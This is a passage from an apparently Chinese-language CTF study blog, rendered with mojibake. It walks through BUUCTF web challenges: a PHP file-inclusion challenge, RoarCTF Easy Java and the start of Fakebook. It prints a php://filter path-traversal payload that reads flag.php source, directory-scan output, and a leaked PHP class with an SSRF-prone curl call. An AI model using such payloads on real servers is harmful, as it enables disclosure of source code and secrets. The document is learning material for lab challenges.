class="hljs-title">form</span>&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class">          &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">      &lt;/<span class="hljs-title">main</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">script</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">js</span>/<span class="hljs-title">material</span>.<span class="hljs-title">min</span>.<span class="hljs-title">js</span>&quot;&gt;&lt;/<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">  &lt;/<span class="hljs-title">body</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>strpos()å‡½æ•°ï¼ŒåŒ¹é…å¯¹åº”å­—ç¬¦  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://512acbf5-c929-427e-aec6-d35d2e44994c.node5.buuoj.cn:81/flag.php<br><br><span class="hljs-comment">&lt;!-- Can you read this flag? --&gt;</span><br></code></pre></td></tr></table></figure>
<p>é¡µé¢æœªè¿”å›404ï¼Œè¯´æ˜flagå°±åœ¨ç«™ç‚¹é»˜è®¤ç›®å½•ä¸‹ï¼Œå¹¶ä¸”æ˜¯.phpåç¼€<br>åŠ ä¸Šæç¤ºï¼Œå°±éœ€è¦è¯»å–flag.phpæºç ï¼Œ<br>æ‰€ä»¥è§£æ³•æ˜¯åˆ©ç”¨index.php?category&#x3D;<br>é‡Œçš„includeå‡½æ•°ï¼Œä½¿ç”¨ä¼ªåè®®ç¼–ç è¯»å–flag.phpçš„æºç   </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php?category=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=woofers<span class="hljs-regexp">/../</span>flag<br><br>è§£ç å¾—åˆ°flag  <br></code></pre></td></tr></table></figure>

<h2 id="notice-phpçš„includeå‡½æ•°è®¿é—®ç›®å½•è§£æï¼š"><a href="#notice-phpçš„includeå‡½æ•°è®¿é—®ç›®å½•è§£æï¼š" class="headerlink" title="notice phpçš„includeå‡½æ•°è®¿é—®ç›®å½•è§£æï¼š"></a>notice phpçš„includeå‡½æ•°è®¿é—®ç›®å½•è§£æï¼š</h2><p>kimi:<br>PHPçš„includeå‡½æ•°åœ¨è§£ææ–‡ä»¶è·¯å¾„æ—¶ä¼šè¿›è¡Œè·¯å¾„æ ‡å‡†åŒ–ï¼Œä¼šæŒ‰æ–‡ä»¶è·¯å¾„ä¸­çš„..&#x2F;è¿›è¡Œç›®å½•è·³è½¬ï¼Œå³ä½¿æ²¡æœ‰å®é™…çš„woofersæ–‡ä»¶ç›®å½•ã€‚  </p>
<p>å½“woofers&#x2F;..&#x2F;flag.phpè¢«ä¼ å…¥å¹¶äº¤ç»™includeå‡½æ•°æ—¶ï¼ŒPHPä¼šå°†å…¶è§£æä¸ºflag.phpï¼Œå› ä¸ºåœ¨è·¯å¾„è§£æè¿‡ç¨‹ä¸­ï¼Œ..&#x2F;ä¼šè·³è¿‡å‰é¢çš„woofersç›®å½•ï¼Œæœ€ç»ˆåªå‰©ä¸‹flag.phpï¼Œè¿™ä¹Ÿå°±å¯¼è‡´äº†æ²¡æœ‰woofersæ–‡ä»¶ç›®å½•çš„æƒ…å†µä¸‹ä¹Ÿèƒ½è§£æåˆ°flag.phpã€‚  </p>
<p>ä¸ºäº†é˜²æ­¢è¿™ç§æƒ…å†µï¼Œä½ åº”è¯¥å¯¹ä¼ å…¥çš„æ–‡ä»¶åè¿›è¡Œä¸¥æ ¼è¿‡æ»¤å’ŒéªŒè¯ï¼Œé¿å…åŒ…å«ç›®å½•è·³è½¬ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œåªå…è®¸åŒ…å«åˆæ³•çš„æ–‡ä»¶åå­—ç¬¦ï¼Œç¡®ä¿ä¼ å…¥çš„æ–‡ä»¶åç¬¦åˆé¢„æœŸçš„æ–‡ä»¶ç›®å½•ç»“æ„ï¼Œå¹¶ä½¿ç”¨ä¸”ç»å¯¹è·¯å¾„æˆ–é™åˆ¶ç›®å½•èŒƒå›´ç­‰æªæ–½ï¼Œæ¥é˜²æ­¢è¿™ç§è·¯å¾„è§£æé—®é¢˜å¯¼è‡´çš„å®‰å…¨é£é™©ã€‚  </p>
<p>q:<br>å¬ä¸æ‡‚ï¼Œæ„æ€..&#x2F;è§£æçš„ä¼˜å…ˆçº§å¤§å—?</p>
<p>kimi:<br>åœ¨è·¯å¾„è§£æä¸­ï¼Œ..&#x2F;çš„ä½œç”¨æ˜¯è¿”å›ä¸Šä¸€çº§ç›®å½•ï¼Œå®ƒä¸æ˜¯ä¼˜å…ˆçº§çš„é—®é¢˜ï¼Œè€Œæ˜¯ä¸€ä¸ªè·¯å¾„è§£æçš„é€»è¾‘ã€‚<br>è·¯å¾„è§£æçš„é€»è¾‘:</p>
<blockquote>
<p>å½“ PHP å¤„ç†æ–‡ä»¶è·¯å¾„æ—¶ï¼Œå®ƒæ˜¯æŒ‰ç…§è·¯å¾„çš„é€»è¾‘æ¥è§£æçš„ã€‚ä¾‹å¦‚ï¼Œå¯¹äºè·¯å¾„woofers&#x2F;..&#x2F;flag.phpï¼ŒPHP ä¼šå…ˆçœ‹åˆ°woofersç›®å½•ï¼Œç„¶åé‡åˆ°..&#x2F;ï¼Œè¿™æ„å‘³ç€è¦å›åˆ°ä¸Šä¸€çº§ç›®å½•ã€‚æœ€åï¼Œå†è®¿é—®flag.phpæ–‡ä»¶ã€‚<br>è¿™ä¸ªè¿‡ç¨‹å¯ä»¥ç±»æ¯”äºä½ åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­æ‰‹åŠ¨å¯¼èˆªç›®å½•ã€‚å‡è®¾ä½ å½“å‰åœ¨æŸä¸ªç›®å½•ä¸‹ï¼Œå…ˆè¿›å…¥wooferså­ç›®å½•ï¼Œç„¶ååˆè¿”å›ä¸Šä¸€çº§ç›®å½•ï¼ˆé€šè¿‡..&#x2F;ï¼‰ï¼Œæ­¤æ—¶ä½ åˆå›åˆ°äº†åŸæ¥çš„ä½ç½®ï¼Œæ¥ç€å†è®¿é—®flag.phpæ–‡ä»¶ã€‚<br>æ‰€ä»¥ï¼Œåœ¨è·¯å¾„è§£æä¸­ï¼Œ..&#x2F;ä¼šæ”¹å˜å½“å‰è·¯å¾„çš„é€»è¾‘ä½ç½®ï¼Œè€Œä¸ç®¡æ–‡ä»¶ç³»ç»Ÿä¸­å®é™…çš„ç›®å½•æ˜¯å¦å­˜åœ¨ã€‚  </p>
</blockquote>
<p>ä¸ºä»€ä¹ˆæ²¡æœ‰woofersç›®å½•ä¹Ÿèƒ½è§£æ:  </p>
<blockquote>
<p>PHP åœ¨è§£æè·¯å¾„æ—¶ï¼Œå¹¶ä¸æ˜¯å…ˆæ£€æŸ¥è·¯å¾„ä¸­çš„æ¯ä¸ªç›®å½•æ˜¯å¦å­˜åœ¨ï¼Œè€Œæ˜¯å…ˆæŒ‰ç…§è·¯å¾„çš„é€»è¾‘è¿›è¡Œæ ‡å‡†åŒ–å¤„ç†ã€‚<br>åœ¨è·¯å¾„woofers&#x2F;..&#x2F;flag.phpä¸­ï¼Œwooferså’Œ..&#x2F;ç›¸äº’æŠµæ¶ˆï¼Œæœ€ç»ˆå¾—åˆ°çš„è·¯å¾„æ˜¯flag.phpã€‚PHP ä¼šå°è¯•å»åŒ…å«è¿™ä¸ªflag.phpæ–‡ä»¶ï¼Œä¸ç®¡å‰é¢çš„woofersç›®å½•æ˜¯å¦å­˜åœ¨ã€‚<br>è¿™å°±å¥½æ¯”ä½ åœ¨æ•°å­¦ä¸­è¿›è¡Œè¿ç®—ï¼Œ5 + 3 - 3çš„ç»“æœæ˜¯ 5ï¼Œä¸­é—´çš„åŠ å’Œå‡æ“ä½œæ˜¯æŒ‰ç…§è¿ç®—é€»è¾‘è¿›è¡Œçš„ï¼Œä¸ç®¡ä¸­é—´çš„æ•°å­—æ˜¯å¦ä»£è¡¨å®é™…å­˜åœ¨çš„ä¸œè¥¿ã€‚<br>è¿™ç§è·¯å¾„è§£ææœºåˆ¶åœ¨ PHP ä¸­æ˜¯æ¯”è¾ƒå¸¸è§çš„ï¼Œå®ƒå…è®¸çµæ´»åœ°å¼•ç”¨æ–‡ä»¶ï¼Œä½†ä¹Ÿå¯èƒ½å¯¼è‡´å®‰å…¨é—®é¢˜ï¼Œå¦‚ç›®å½•éå†æ”»å‡»ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆéœ€è¦å¯¹ç”¨æˆ·è¾“å…¥çš„æ–‡ä»¶åè¿›è¡Œä¸¥æ ¼è¿‡æ»¤å’ŒéªŒè¯çš„åŸå› ã€‚  </p>
</blockquote>
<p>æˆ‘æƒ³å¤§æ¦‚æ„æ€å°±æ˜¯ä¼šå…ˆè§£æå®Œç›®å½•ï¼Œå†å»è®¿é—®ç›®å½•æ˜¯å¦å­˜åœ¨ï¼Œæ‰€ä»¥å®ƒæ˜¯å…ˆè§£æå®Œ<br>woofers&#x2F;..&#x2F;flag.php  &#x3D;<br>&#x2F;flag<br>å†å»è®¿é—®è§£æå®Œçš„ç›®å½•ï¼Œè€Œä¸ä¼šåœ¨è§£ææ—¶å»è®¿é—®woofersç›®å½•</p>
<h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>è¯•äº†sqlæ³¨å…¥ï¼Œç‚¹äº†hlepï¼Œç„¶åè¯•äº†ä¸€ä¸‹å¸¸è§„çš„ç›®å½•ç©¿è¶Šï¼Œæ— æœ<br>ç”¨dirsearchæ‰«å‡ºäº†&#x2F;images è®¿é—®ï¼Œ404ï¼Œ<br>å¾—åˆ°æœåŠ¡å™¨ä¿¡æ¯ï¼š<br>Apache Tomcat&#x2F;8.5.24  æ˜¯ä¸€ä¸ªåŸºäºjavaçš„æœåŠ¡ç«¯<br>ç›´æ¥è®¿é—®äº†help.docx<br><a target="_blank" rel="noopener" href="http://420afca9-2c54-4dc1-9d86-cc41a97eb1bf.node5.buuoj.cn:81/help.docx">http://420afca9-2c54-4dc1-9d86-cc41a97eb1bf.node5.buuoj.cn:81/help.docx</a><br>ä¸‹è½½help.docx<br>é‡Œé¢åªæœ‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs docx">Are you sure the flag is here? ? ?<br></code></pre></td></tr></table></figure>
<p>webé¢˜å°±ä¸è€ƒè™‘docxéšå†™å•¥çš„äº†  </p>
<p>çœ‹wpï¼š<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/xhy18634297976/article/details/123117897">https://blog.csdn.net/xhy18634297976/article/details/123117897</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/MrSoap/p/18356439">https://www.cnblogs.com/MrSoap/p/18356439</a>  </p>
<p>ç›´æ¥æ¬è¿‡æ¥ï¼š<br>WEB-INF æ˜¯Javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ã€‚å¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡web.xmlæ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚  </p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stata"> WEB-<span class="hljs-keyword">INF</span>ä¸»è¦åŒ…å«ä»¥ä¸‹æ–‡ä»¶æˆ–ç›®å½•ï¼š<br>/WEB-<span class="hljs-keyword">INF</span>/web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚<br>/WEB-<span class="hljs-keyword">INF</span>/classes/ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ <span class="hljs-keyword">class</span> æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet <span class="hljs-keyword">class</span> å’Œéservlet <span class="hljs-keyword">class</span>ï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­<br>/WEB-<span class="hljs-keyword">INF</span>/lib/ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶<br>/WEB-<span class="hljs-keyword">INF</span>/src/ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚<br>/WEB-<span class="hljs-keyword">INF</span>/database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶<br></code></pre></td></tr></table></figure>
<p>web.xmlé‡Œè®°æœ‰æ˜ å°„çš„æ–‡ä»¶ï¼Œä¼¼ä¹æ˜¯æŠŠurlçš„è¯·æ±‚æ˜ å°„åˆ°æŒ‡å®šçš„ç¼–è¯‘å·çš„javaç¨‹åºï¼Œclassæ–‡ä»¶ï¼Œå¯èƒ½å’Œphpæ–‡ä»¶å·®ä¸å¤šå§  </p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/MrSoap/p/18356439">https://www.cnblogs.com/MrSoap/p/18356439</a><br>è¯´çš„å¾ˆæ¸…æ¥šäº†  </p>
<p>æ¼æ´æˆå› ï¼š<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/xhy18634297976/article/details/123117897">https://blog.csdn.net/xhy18634297976/article/details/123117897</a>    </p>
<p>åæ­£æœ€åæ˜¯ç”¨downloadæ–‡ä»¶ä¸‹è½½äº†flagcontainerçš„classæ–‡ä»¶ï¼Œåº”è¯¥å°±æ˜¯ç¨‹åºçš„æºç ï¼Ÿ<br>æˆ–è€…å•¥çš„<br>ç„¶åé‡Œé¢æœ‰base64çš„flag  </p>
<p>è¿™é¢˜å¦‚é¢˜ï¼Œez java<br>æ²¡æ¥è§¦è¿‡ï¼Œä¸æ‡‚    </p>
<h2 id="class-æ–‡ä»¶æ˜¯ä»€ä¹ˆ"><a href="#class-æ–‡ä»¶æ˜¯ä»€ä¹ˆ" class="headerlink" title=".class æ–‡ä»¶æ˜¯ä»€ä¹ˆ"></a>.class æ–‡ä»¶æ˜¯ä»€ä¹ˆ</h2><p>.class æ–‡ä»¶æ˜¯Javaç¼–è¯‘å™¨ç”Ÿæˆçš„å­—èŠ‚ç æ–‡ä»¶ï¼Œå®ƒåŒ…å«äº†Javaæºä»£ç ç¼–è¯‘åçš„äºŒè¿›åˆ¶è¡¨ç¤ºã€‚Javaè™šæ‹Ÿæœºï¼ˆJVMï¼‰å¯ä»¥ç›´æ¥æ‰§è¡Œè¿™äº›å­—èŠ‚ç æ–‡ä»¶ï¼Œè€Œæ— éœ€ä¾èµ–ç‰¹å®šçš„ç¡¬ä»¶å¹³å°æˆ–æ“ä½œç³»ç»Ÿ</p>
<h1 id="ç½‘é¼æ¯-2018-Fakebook"><a href="#ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook"></a>[ç½‘é¼æ¯ 2018]Fakebook</h1><p>ä¸Šæ¥æ˜¯ä¸€ä¸ªç™»å½•å’Œæ³¨å†Œé¡µé¢ï¼Œè¯´åˆ†äº«æ•…äº‹å•¥çš„<br>ä¸Šæ¥å…»æˆå¥½ä¹ æƒ¯ï¼Œå…ˆæŒ‰f12çœ‹ä¸€ä¸‹å‰ç«¯ç•™æœ‰å•¥ï¼Œ<br>æœäº†ä¸€ä¸‹flagå’Œphpï¼Œæ²¡å‘ç°æœ‰å•¥  </p>
<p>é‚£å°±ç”¨bp fuzzä¸€ä¸‹loginç•Œé¢<br>è§†ä¹æ— æ³•æ³¨å…¥  </p>
<p>ç„¶åå†joinè¯•äº†å¥½å¤šï¼Œéƒ½æ˜¯blog is not valid<br>æ‰«äº†ä¸€ä¸‹æœåŠ¡å™¨ï¼š</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[00:10:49]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">185</span>B  - /js  -&gt;  http:<span class="hljs-comment">//22e4b823-f430-45fb-9de3-bc621615b379.node5.buuoj.cn/js/</span><br><span class="hljs-selector-attr">[00:11:17]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /<span class="hljs-selector-class">.css</span><br><span class="hljs-selector-attr">[00:11:37]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /<span class="hljs-selector-class">.gif</span><br><span class="hljs-selector-attr">[00:11:57]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /<span class="hljs-selector-class">.ico</span><br><span class="hljs-selector-attr">[00:12:06]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /<span class="hljs-selector-class">.jpeg</span><br><span class="hljs-selector-attr">[00:12:06]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /<span class="hljs-selector-class">.jpg</span><br><span class="hljs-selector-attr">[00:12:33]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /<span class="hljs-selector-class">.png</span><br><span class="hljs-selector-attr">[00:16:13]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /adm/style/admin<span class="hljs-selector-class">.css</span><br><span class="hljs-selector-attr">[00:17:30]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /admin_my_avatar<span class="hljs-selector-class">.png</span><br><span class="hljs-selector-attr">[00:21:17]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">185</span>B  - /css  -&gt;  http:<span class="hljs-comment">//22e4b823-f430-45fb-9de3-bc621615b379.node5.buuoj.cn/css/</span><br><span class="hljs-selector-attr">[00:21:28]</span> <span class="hljs-number">200</span> -    <span class="hljs-number">0</span>B  - /db<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[00:22:15]</span> <span class="hljs-number">200</span> -    <span class="hljs-number">0</span>B  - /error<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[00:22:32]</span> <span class="hljs-number">200</span> -    <span class="hljs-number">6</span>KB - /favicon<span class="hljs-selector-class">.ico</span><br><span class="hljs-selector-attr">[00:22:42]</span> <span class="hljs-number">200</span> -    <span class="hljs-number">0</span>B  - /flag<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[00:24:02]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">571</span>B  - /js/<br><span class="hljs-selector-attr">[00:24:35]</span> <span class="hljs-number">200</span> -    <span class="hljs-number">1</span>KB - /login<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[00:24:40]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /logo<span class="hljs-selector-class">.gif</span><br><span class="hljs-selector-attr">[00:27:44]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /resources/<span class="hljs-selector-class">.arch-internal-preview</span><span class="hljs-selector-class">.css</span><br><span class="hljs-selector-attr">[00:27:49]</span> <span class="hljs-number">200</span> -   <span class="hljs-number">37</span>B  - /robots<span class="hljs-selector-class">.txt</span><br><span class="hljs-selector-attr">[00:28:36]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /skin1_admin<span class="hljs-selector-class">.css</span><br><span class="hljs-selector-attr">[00:29:57]</span> <span class="hljs-number">200</span> -    <span class="hljs-number">0</span>B  - /user<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[00:30:20]</span> <span class="hljs-number">200</span> - <span class="hljs-number">1019</span>B  - /view.php<br></code></pre></td></tr></table></figure>
<p>æœ‰robots.txt,é‡Œé¢æç¤ºæœ‰ä¸€ä¸ª<br>user.php.bak<br>å¤‡ä»½æ–‡ä»¶  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-variable language_">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
<p>ç»™deepseekä¸€çœ‹ï¼Œå®ƒè¯´æœ‰ssrfæ¼æ´ï¼Œè¿˜æ²¡æ¥è§¦è¿‡å‘¢<br>ç„¶åä¹Ÿæ˜¯çœ‹æ‡‚è¿™ä¸ªç½‘ç«™çš„é€»è¾‘äº†ï¼Œå°±æ˜¯ä½ èƒ½æ³¨å†Œå§“åå’Œè´¦å·ï¼Œç„¶åæŠŠä½ çš„blogé“¾æ¥æŒ‚ä¸Šå»<br>æ‰€ä»¥blogé‚£æ å¿…é¡»æ˜¯åŸŸåè¿˜å¾—æ˜¯äºŒçº§åŸŸåå•¥çš„ï¼Œ  </p>
<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">ä¾¿å°è¯•ï¼š<br>http://cd541869-c627<span class="hljs-string">-4</span>baf<span class="hljs-string">-920</span>d<span class="hljs-string">-2</span>fd4728ad4f0.node5.buuoj.cn:81/flag.php<br>æ”¾ä¸Šå»å½“ä½œblogé“¾æ¥<br></code></pre></td></tr></table></figure>
<p>ä¸€æ¬¡æ”¾æˆ‘æ­£å¸¸çš„blogé“¾æ¥ï¼Œ<br>ä¸€æ¬¡æ”¾ï¼š<br><a target="_blank" rel="noopener" href="http://cd541869-c627-4baf-920d-2fd4728ad4f0.node5.buuoj.cn:81/flag.php">http://cd541869-c627-4baf-920d-2fd4728ad4f0.node5.buuoj.cn:81/flag.php</a>  </p>
<p>æ²¡æ€è·¯ï¼Œä¸çŸ¥é“æ€ä¹ˆä¸‹æ‰‹ï¼Œæ‰¾wpçœ‹å§  </p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">å…ˆè®¿é—®<br>/<span class="hljs-keyword">view</span>.php<br>å¾—åˆ°<br><br><span class="hljs-keyword">Notice</span>: Undefined <span class="hljs-keyword">index</span>: <span class="hljs-keyword">no</span> <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">view</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">24</span><br>[*] query error! (You have an error <span class="hljs-keyword">in</span> your <span class="hljs-keyword">SQL</span> syntax; <span class="hljs-keyword">check</span> the manual that corresponds <span class="hljs-keyword">to</span> your MariaDB <span class="hljs-keyword">server</span> <span class="hljs-keyword">version</span> <span class="hljs-keyword">for</span> the right syntax <span class="hljs-keyword">to</span> use near <span class="hljs-string">&#x27;&#x27;</span> at <span class="hljs-type">line</span> <span class="hljs-number">1</span>)<br><br><br>Fatal error: <span class="hljs-keyword">Call</span> <span class="hljs-keyword">to</span> a member <span class="hljs-keyword">function</span> fetch_assoc() <span class="hljs-keyword">on</span> <span class="hljs-type">boolean</span> <span class="hljs-keyword">in</span> /var/www/html/db.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">66</span><br><br>å¯ä»¥çŸ¥é“ç«™ç‚¹ç›®å½•<br></code></pre></td></tr></table></figure>
